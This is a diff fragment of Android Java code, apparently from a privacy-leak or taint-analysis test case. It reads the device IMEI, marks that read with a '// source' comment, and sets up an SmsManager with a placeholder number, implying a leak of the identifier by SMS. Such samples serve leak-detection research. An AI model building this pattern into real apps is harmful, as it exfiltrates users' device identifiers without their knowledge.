@@ -70,7 +70,7 @@ se++;
         if (se>7)
         {
         	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        	String imei = telephonyManager.getDeviceId(); 
+        	String imei = telephonyManager.getDeviceId(); // source
         	
 			SmsManager sm = SmsManager.getDefault();
 	    	String number = "+49 1234";
